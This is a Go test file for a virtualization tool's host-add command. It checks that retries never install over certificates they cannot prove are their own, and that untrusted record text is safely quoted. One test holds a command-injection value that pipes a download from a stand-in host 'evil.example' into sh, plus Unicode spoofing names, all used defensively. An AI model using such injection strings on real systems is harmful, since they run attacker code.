package cli

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/litevirt/litevirt/internal/pki"
)

// installPair writes a certificate and key minted by the CA in caDir (a new
// CA when caDir is "") as the target's host.crt and host.key, and returns
// the certificate's serial.
func installPair(t *testing.T, f *addFixture, caDir, name string) string {
	t.Helper()
	if caDir == "" {
		caDir = t.TempDir()
		if err := pki.GenerateCA(filepath.Join(caDir, "ca.crt"), filepath.Join(caDir, "ca.key")); err != nil {
			t.Fatal(err)
		}
	}
	tmp := t.TempDir()
	if err := pki.GenerateHostCert(filepath.Join(caDir, "ca.crt"), filepath.Join(caDir, "ca.key"),
		filepath.Join(tmp, "h.crt"), filepath.Join(tmp, "h.key"), name, net.IPv4(10, 0, 0, 9)); err != nil {
		t.Fatal(err)
	}
	for _, n := range []string{"crt", "key"} {
		if err := os.WriteFile(filepath.Join(f.targetPKI, "host."+n), mustRead(t, filepath.Join(tmp, "h."+n)), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return installedSerial(mustRead(t, filepath.Join(tmp, "h.crt")))
}

// revoke adds serial to the operator's CRL, as `lv host rm` does.
func revoke(t *testing.T, opPKI, serial string) {
	t.Helper()
	if err := pki.AppendToCRL(filepath.Join(opPKI, "ca.crt"), filepath.Join(opPKI, "ca.key"),
		filepath.Join(opPKI, "crl.pem"), serial); err != nil {
		t.Fatal(err)
	}
}

// reachedInstall reports whether events show the add stopping the daemon or
// installing anything.
func reachedInstall(events []string) bool {
	for _, e := range events {
		if e == "sh install" || e == "sh binary" || strings.Contains(e, "systemctl stop") {
			return true
		}
	}
	return false
}

// strandedAdd runs a first add of node-9 that is admitted and whose setup
// fails: its rollback puts the machine's identity back and leaves the
// admitted pair staged, and node-9 is joining. It returns the admitted
// serial.
func strandedAdd(t *testing.T, f *addFixture) string {
	t.Helper()
	f.target.FailSetup = fmt.Errorf("setup failed")
	if err := f.add(t); err == nil {
		t.Fatal("the first add succeeded")
	}
	f.target.FailSetup = nil
	f.identityUnchanged(t)
	return f.client.admitted[0]
}

// Codex hostadd-foreign I2, findings (a), (b), (c), (e): a retry of a
// stranded admission compared the machine's certificate with what IT found
// when it began, so a certificate B another installer put there after the
// first attempt was the retry's baseline: the retry reused the staged pair,
// the same-name record returned before any revocation check, and it
// stopped the daemon and installed over B. The CRL check, where reached,
// tested the record's serial, not B. A retry keeps the first attempt's
// recorded expectation (what the machine served before it) now: B is
// neither that nor the admission's certificate nor revoked by this
// cluster, so the retry stops nothing, installs nothing, and names the one
// command that settles the admission while leaving B, not a rerun.
//
// Mutations: take the retry's own observation as the expectation — every
// case installs over B; test the record's serial for revocation instead of
// the installed certificate — "another name's revoked install" installs
// over B.
func TestHostAdd_ARetryNeverInstallsOverACertificateNotProvenItsOwn(t *testing.T) {
	for _, tc := range []struct {
		name   string
		marker func(t *testing.T, f *addFixture, serial string) string
	}{
		{"no record", func(*testing.T, *addFixture, string) string { return "" }},
		{"the stranded add's stale claim", func(_ *testing.T, _ *addFixture, serial string) string {
			return fmt.Sprintf("node-9 %s 1 deadbeef0000 installing\n", serial)
		}},
		{"another name's revoked install", func(t *testing.T, f *addFixture, _ string) string {
			x := installPair(t, f, f.opPKI, "node-x")
			revoke(t, f.opPKI, x)
			return fmt.Sprintf("node-x %s %d cafecafe0000 installed\n", x, time.Now().Unix())
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newAddFixture(t)
			serial := strandedAdd(t, f)
			if m := tc.marker(t, f, serial); m != "" {
				writeMarker(t, f.target, m)
			}
			b := installPair(t, f, "", "foreign")
			bBytes := mustRead(t, filepath.Join(f.targetPKI, "host.crt"))
			f.target.Events = nil
			err := f.add(t)
			if err == nil {
				t.Fatal("the retry installed over a certificate nothing proves is its own")
			}
			for _, want := range []string{b, "lv host rm node-9 --serial " + serial + " --address 10.0.0.9"} {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("retry = %v, want it to name %q", err, want)
				}
			}
			if strings.Contains(err.Error(), "lv host add") {
				t.Errorf("retry = %v: it advertises a rerun", err)
			}
			if reachedInstall(f.target.Events) {
				t.Errorf("the retry stopped the daemon or installed: %v", f.target.Events)
			}
			if !bytes.Equal(mustRead(t, filepath.Join(f.targetPKI, "host.crt")), bBytes) {
				t.Error("the machine's certificate B was replaced")
			}
		})
	}
}

// The control: a certificate this cluster's CA issued and revoked (a host
// removed with `lv host rm`) is proven to be no live admission's, and a
// retry finishes the stranded add over it; so does a retry that finds what
// the first attempt found. A foreign CA's certificate with a revoked serial
// is not this cluster's revocation, and is refused.
//
// Mutation: drop the issuer check — "a foreign certificate of a revoked
// serial" installs.
func TestHostAdd_ARetryFinishesOverWhatItProves(t *testing.T) {
	t.Run("revoked by this cluster", func(t *testing.T) {
		f := newAddFixture(t)
		serial := strandedAdd(t, f)
		revoke(t, f.opPKI, installPair(t, f, f.opPKI, "removed"))
		if err := f.add(t); err != nil {
			t.Fatalf("retry over a revoked certificate: %v", err)
		}
		servesItsAdmittedPair(t, f.targetPKI, serial)
	})
	t.Run("what the first attempt found", func(t *testing.T) {
		f := newAddFixture(t)
		serial := strandedAdd(t, f)
		otherOperator(t, f.opPKI)
		if err := f.add(t); err != nil {
			t.Fatalf("retry over the machine as the first attempt found it: %v", err)
		}
		servesItsAdmittedPair(t, f.targetPKI, serial)
	})
	t.Run("a foreign certificate of a revoked serial", func(t *testing.T) {
		f := newAddFixture(t)
		strandedAdd(t, f)
		revoke(t, f.opPKI, installPair(t, f, "", "foreign"))
		f.target.Events = nil
		if err := f.add(t); err == nil || reachedInstall(f.target.Events) {
			t.Fatalf("retry over another CA's certificate = %v (events %v), want refused", err, f.target.Events)
		}
	})
}

// Codex hostadd-foreign (c): the stranded admission's row not listed (the
// replica asked has not received it), the retry was a fresh add with its
// own baseline, and installed over B. The first attempt's record on the
// machine still says what it found: a fresh add that finds an unsettled
// attempt's record and a certificate that attempt did not find changes
// nothing, not even an admission.
//
// Mutation: skip the record check — the fresh add installs over B.
func TestHostAdd_AFreshAddKeepsAnUnsettledAttemptsExpectation(t *testing.T) {
	f := newAddFixture(t)
	serial := strandedAdd(t, f)
	installPair(t, f, "", "foreign")
	bBytes := mustRead(t, filepath.Join(f.targetPKI, "host.crt"))
	lagging := &hostAddTestClient{target: f.target, hosts: f.client.hosts[:1]}
	f.client = lagging
	f.target.Events = nil
	err := f.add(t)
	if err == nil || !strings.Contains(err.Error(), "lv host rm node-9 --serial "+serial+" --address 10.0.0.9") {
		t.Fatalf("fresh add = %v, want the refusal naming the unsettled admission", err)
	}
	if len(lagging.admitted) != 0 || reachedInstall(f.target.Events) {
		t.Errorf("admitted %v, events %v: want nothing admitted or installed", lagging.admitted, f.target.Events)
	}
	if !bytes.Equal(mustRead(t, filepath.Join(f.targetPKI, "host.crt")), bBytes) {
		t.Error("the machine's certificate B was replaced")
	}
}

// Codex hostadd-foreign (e): a record of the same name returned before the
// revocation check, so an install under the name by another admission, an
// unrevoked certificate the machine serves, was replaced by a fresh add of
// the name. The same name decides nothing now: another admission's recent
// install that this cluster has not revoked keeps the machine.
//
// Mutation: restore the same-name return — the add installs over it.
func TestHostAdd_TheSameNameDoesNotBypassAnotherAdmissionsInstall(t *testing.T) {
	f := newAddFixture(t)
	x := installPair(t, f, f.opPKI, "node-9")
	xBytes := mustRead(t, filepath.Join(f.targetPKI, "host.crt"))
	writeMarker(t, f.target, fmt.Sprintf("node-9 %s %d cafecafe0000 installed\n", x, time.Now().Unix()))
	err := f.add(t)
	if err == nil || !strings.Contains(err.Error(), x) || !strings.Contains(err.Error(), "installs nothing") {
		t.Fatalf("add = %v, want the refusal naming the other admission's certificate", err)
	}
	if !strings.Contains(err.Error(), "lv host rm node-9 --serial "+f.client.admitted[0]) {
		t.Errorf("add = %v, want it to name the removal of its own admission by serial", err)
	}
	if reachedInstall(f.target.Events) {
		t.Errorf("installed over another admission's install: %v", f.target.Events)
	}
	if !bytes.Equal(mustRead(t, filepath.Join(f.targetPKI, "host.crt")), xBytes) {
		t.Error("the other admission's certificate was replaced")
	}
}

// Codex foreign-install I2 residual: the recent-install rule let an add in
// when the RECORD's serial was revoked, whatever the machine served: a
// revoked A's record left behind passed a fresh add over a foreign B, and so
// did a foreign certificate whose serial number this CRL lists. What decides
// is the certificate installed: nothing, this admission's own, or one this
// cluster's CA issued and revoked.
//
// Mutation: exempt on the record's serial's revocation — both refusals
// install over B.
func TestHostAdd_ARecentInstallIsJudgedByTheCertificateInstalled(t *testing.T) {
	t.Run("a revoked admission's record over a foreign certificate", func(t *testing.T) {
		f := newAddFixture(t)
		a := installPair(t, f, f.opPKI, "node-a")
		revoke(t, f.opPKI, a)
		writeMarker(t, f.target, fmt.Sprintf("node-a %s %d cafecafe0000 installed\n", a, time.Now().Unix()))
		installPair(t, f, "", "foreign")
		bBytes := mustRead(t, filepath.Join(f.targetPKI, "host.crt"))
		if err := f.add(t); err == nil || !strings.Contains(err.Error(), "installs nothing") {
			t.Fatalf("add = %v, want refused", err)
		}
		if reachedInstall(f.target.Events) || !bytes.Equal(mustRead(t, filepath.Join(f.targetPKI, "host.crt")), bBytes) {
			t.Errorf("installed over B: %v", f.target.Events)
		}
	})
	t.Run("another CA's certificate whose serial this CRL lists", func(t *testing.T) {
		f := newAddFixture(t)
		b := installPair(t, f, "", "foreign")
		revoke(t, f.opPKI, b)
		writeMarker(t, f.target, fmt.Sprintf("node-x %s %d cafecafe0000 installed\n", b, time.Now().Unix()))
		if err := f.add(t); err == nil || reachedInstall(f.target.Events) {
			t.Fatalf("add = %v (events %v), want refused", err, f.target.Events)
		}
	})
	t.Run("this cluster's revoked certificate", func(t *testing.T) {
		f := newAddFixture(t)
		x := installPair(t, f, f.opPKI, "node-x")
		revoke(t, f.opPKI, x)
		writeMarker(t, f.target, fmt.Sprintf("node-x %s %d cafecafe0000 installed\n", x, time.Now().Unix()))
		if err := f.add(t); err != nil {
			t.Fatalf("add over a revoked install: %v", err)
		}
		servesItsAdmittedPair(t, f.targetPKI, f.client.admitted[0])
	})
}

// Our review I2: the name in another attempt's record is the machine's text,
// and was printed inside the command the operator is told to run. A record
// name that does not print safely (a control character, say) is not printed
// or used; nor are an install record's fields that do not parse. A name that
// prints safely is printed only as one quoted shell word of the settle
// command, which sh splits into exactly that command and which runs nothing
// else.
//
// Mutations: echo any name lv host rm takes (settleName, not echoableName)
// — the look-alike letter is echoed; with addRecords' and settleName's
// printable checks also gone, every non-ASCII and control case is;
// shellWord returns its input — the metacharacter name splits and runs.
func TestHostAdd_AMachinesTextNeverReachesAPrintedCommand(t *testing.T) {
	const evil = "x;curl${IFS}evil.example|sh;#"
	t.Run("an attempt record", func(t *testing.T) {
		f := newAddFixture(t)
		installPair(t, f, "", "foreign")
		if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
			[]byte(evil+" -\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		err := f.add(t)
		if err == nil {
			t.Fatal("add over another attempt's record: nil")
		}
		m := regexp.MustCompile("`(lv host rm [^`]*)`").FindStringSubmatch(err.Error())
		if m == nil {
			t.Fatalf("add = %v, want the settle command", err)
		}
		dir := t.TempDir()
		got := shellWords(t, dir, m[1])
		want := []string{"lv", "host", "rm", evil, "--serial", "abc", "--address", "10.0.0.9"}
		if strings.Join(got, "\x00") != strings.Join(want, "\x00") {
			t.Errorf("%q splits as %q, want %q", m[1], got, want)
		}
		if ents, _ := os.ReadDir(dir); len(ents) != 0 {
			t.Errorf("evaluating %q ran something: %v", m[1], ents)
		}
		if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
			t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
		}
	})
	// A name echoed only when every byte is printable ASCII: a control
	// character, a bidi override (U+202E), a zero-width space (U+200B) or a
	// look-alike letter (Cyrillic U+043E) could make the command shown differ
	// from the one that runs, so none is printed, nor a command with it.
	for _, tc := range []struct{ what, name string }{
		{"a control character", "x\x1b[2Jcurl"},
		{"a bidi override", "node\u202e9-curl"},
		{"a zero-width space", "node\u200b-9curl"},
		{"a look-alike letter", "n\u043ede-9curl"},
	} {
		t.Run("an attempt record with "+tc.what, func(t *testing.T) {
			f := newAddFixture(t)
			installPair(t, f, "", "foreign")
			if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
				[]byte(tc.name+" -\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			err := f.add(t)
			if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "lv host rm") {
				t.Fatalf("add = %v, want a refusal that does not echo the record", err)
			}
			if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
				t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
			}
		})
	}
	t.Run("an install record", func(t *testing.T) {
		f := newAddFixture(t)
		writeMarker(t, f.target, fmt.Sprintf("%s %s %d %s installing\n", evil, evil, time.Now().Unix(), evil))
		err := f.add(t)
		if err == nil || strings.Contains(err.Error(), "curl") {
			t.Fatalf("add = %v, want a refusal that does not echo the record", err)
		}
	})
}

// Our review m1: an attempt that died after writing its record and before
// its admission, without unstaging, left a record of a serial no row holds,
// which outlived the next add and, once that add was removed (its
// certificate revoked), refused the re-add. Over a certificate this cluster
// revoked, such a record protects nothing: the re-add goes ahead, and the
// record goes.
//
// Mutation: drop the revoked-certificate exemption from the record scan —
// the re-add is refused.
func TestHostAdd_ANeverAdmittedRecordGoesOverARevokedCertificate(t *testing.T) {
	f := newAddFixture(t)
	o := installedSerial(f.before["host.crt"])
	stale := filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before")
	if err := os.WriteFile(stale, []byte("node-9 "+o+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := f.add(t); err != nil {
		t.Fatalf("first add over the unchanged machine: %v", err)
	}
	revoke(t, f.opPKI, f.client.admitted[0]) // lv host rm node-9
	f.client = &hostAddTestClient{target: f.target, hosts: f.client.hosts[:1]}
	if err := f.add(t); err != nil {
		t.Fatalf("re-add over the removed host's certificate: %v", err)
	}
	if _, err := os.Stat(stale); !os.IsNotExist(err) {
		t.Errorf("the never-admitted attempt's record is still there (stat: %v)", err)
	}
}

// Our review m2: a retry's expectation comes only from its own serial's
// records. The admission's own record is gone (as an earlier release's
// staged add has none), and another serial's record says the machine served
// B before it: B is still unproven for this admission.
//
// Mutation: read every serial's records in recordedExpect — the retry
// installs over B.
func TestHostAdd_ARetryReadsOnlyItsOwnSerialsRecords(t *testing.T) {
	f := newAddFixture(t)
	serial := strandedAdd(t, f)
	recs, _ := filepath.Glob(filepath.Join(f.targetPKI, ".host.crt.add-"+serial+"-*.before"))
	if len(recs) == 0 {
		t.Fatal("no record of the stranded attempt")
	}
	for _, r := range recs {
		if err := os.Remove(r); err != nil {
			t.Fatal(err)
		}
	}
	b := installPair(t, f, "", "foreign")
	if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
		[]byte("node-x "+b+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	f.target.Events = nil
	if err := f.add(t); err == nil || reachedInstall(f.target.Events) {
		t.Fatalf("retry = %v (events %v): installed over B on another serial's record", err, f.target.Events)
	}
}

// Coordinator round 2: the install record was split on blanks, so an
// earlier release's record of a host named "a b" read as name "a", serial
// "b", and a time that did not parse: a later add of "a" found another
// admission's recent install a 1970 one and installed over it, and a held
// claim read as no claim. The name is quoted when it has a blank now, and an
// earlier release's record is read from the right.
//
// Mutation: split on blanks again — both subtests install.
func TestHostAdd_AHostNameWithABlankIsOneFieldOfTheRecord(t *testing.T) {
	t.Run("an earlier release's record of a recent install", func(t *testing.T) {
		f := newAddFixture(t)
		x := installPair(t, f, f.opPKI, "a b")
		writeMarker(t, f.target, fmt.Sprintf("a b %s %d cafecafe0000 installed\n", x, time.Now().Unix()))
		err := HostAddOn(context.Background(), f.client, f.target, "a", "10.0.0.9")
		if err == nil || !strings.Contains(err.Error(), "installs nothing") || reachedInstall(f.target.Events) {
			t.Fatalf("add of a = %v (events %v), want refused", err, f.target.Events)
		}
	})
	t.Run("an earlier release's held claim", func(t *testing.T) {
		f := newAddFixture(t)
		writeMarker(t, f.target, fmt.Sprintf("a b abcd %d cafecafe0000 installing\n", time.Now().Unix()))
		err := HostAddOn(context.Background(), f.client, f.target, "a", "10.0.0.9")
		if err == nil || !strings.Contains(err.Error(), "holds this machine") || reachedInstall(f.target.Events) {
			t.Fatalf("add of a = %v, want the held claim's refusal", err)
		}
	})
	for _, tc := range []struct {
		line string
		want []string
	}{
		{markerLine("a b", "abcd", 7, "0123456789ab", "installed"), []string{"a b", "abcd", "7", "0123456789ab", "installed"}},
		{markerLine(`q"t`, "abcd", 7, "0123456789ab", "installing"), []string{`q"t`, "abcd", "7", "0123456789ab", "installing"}},
		{markerLine("node-9", "abcd", 7, "0123456789ab", "installed"), []string{"node-9", "abcd", "7", "0123456789ab", "installed"}},
		{"node-9 abcd 7 0123456789ab installed", []string{"node-9", "abcd", "7", "0123456789ab", "installed"}},
		{"a b abcd 7 0123456789ab installed", []string{"a b", "abcd", "7", "0123456789ab", "installed"}},
		{"a b abcd 7 0123456789ab", []string{"a b", "abcd", "7", "0123456789ab"}},
		{"node-9 abcd 7", []string{"node-9", "abcd", "7"}},
	} {
		if got := markerFields(tc.line); strings.Join(got, "|") != strings.Join(tc.want, "|") {
			t.Errorf("markerFields(%q) = %q, want %q", tc.line, got, tc.want)
		}
	}
	if markerLine("node-9", "abcd", 7, "0123456789ab", "installed") != "node-9 abcd 7 0123456789ab installed" {
		t.Error("a plain name's record is not byte-identical to an earlier release's")
	}
}
